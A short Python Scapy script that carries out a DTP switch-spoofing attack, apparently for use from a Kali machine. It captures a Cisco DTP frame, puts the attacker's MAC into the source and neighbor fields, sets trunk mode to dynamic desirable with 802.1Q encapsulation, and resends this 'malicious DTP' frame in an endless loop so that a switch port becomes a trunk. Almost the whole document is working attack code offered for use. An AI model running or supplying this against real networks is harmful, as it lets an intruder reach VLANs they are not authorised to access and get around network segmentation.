# v0.1

import sys
import re
from scapy.all import *

load_contrib("dtp")

int = "eth0"

try:
    mac = sys.argv[1]  
    if not re.match("^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$", mac.lower()):
        print("MAC address must be in format: 00:11:22:33:44:55, exiting")
        sys.exit(1)
except IndexError:
    print("You must enter Kali's MAC adress, e.g. 00:11:22:33:44:55 as argument")
    sys.exit(1)

# Capture one packet sent from neighbour switch to well-known multicast address
pkt = sniff(iface="eth0", count=1, filter="ether dst 01:00:0c:cc:cc:cc")

# Change source MAC 
pkt[0].src = mac

# Change MAC address of the neighbor 
pkt[0][DTP][DTPNeighbor].neighbor = mac

# Change trunk mode to dynamic desirable
pkt[0][DTP][DTPStatus].status = '\x03'
      
# Change trunk type to 802.1q
pkt[0][DTP][DTPType].dtptype = 'E'

# Send malicious DTP endlessly
while True:
    sendp(pkt[0], verbose=1, iface=int)
    time.sleep(10)
      




    





